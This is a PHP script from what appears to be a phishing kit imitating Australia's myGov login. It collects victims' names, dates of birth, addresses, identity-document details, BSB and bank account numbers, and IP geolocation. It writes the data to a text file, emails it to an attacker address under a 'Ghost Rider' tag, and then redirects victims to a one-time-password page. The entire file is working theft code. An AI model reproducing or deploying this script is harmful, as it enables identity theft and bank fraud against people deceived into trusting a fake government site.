<?php
	
	$fname = $_POST['fname'];
	$dob = $_POST['dob'];
	$addr = $_POST['address'];
	$issued = $_POST['issued'];
	$reference = $_POST['reference'];
	$bsb = $_POST['bsb'];
	$acct = $_POST['acct'];
    require_once('../Email.php');
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($fname != null && $dob != null && $addr != null && $issued != null && $reference != null && $bsb != null && $acct != null){

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Full Name: " .$fname. "\n"; 
    $message .= "Date of Birth: " .$dob. "\n";
    $message .= "Full Address on File: " .$addr. "\n"; 
    $message .= "Date of issues: " .$issued. "\n";
    $message .= "Reference number: " .$reference. "\n"; 
    $message .= "BSB number: " .$bsb. "\n";
    $message .= "bank account number: " .$acct. "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$handle = fopen("../JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$subject = "login.my.gov.au l $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	}
	}
?>
<script>
	window.location="../otp2.html";
</script>

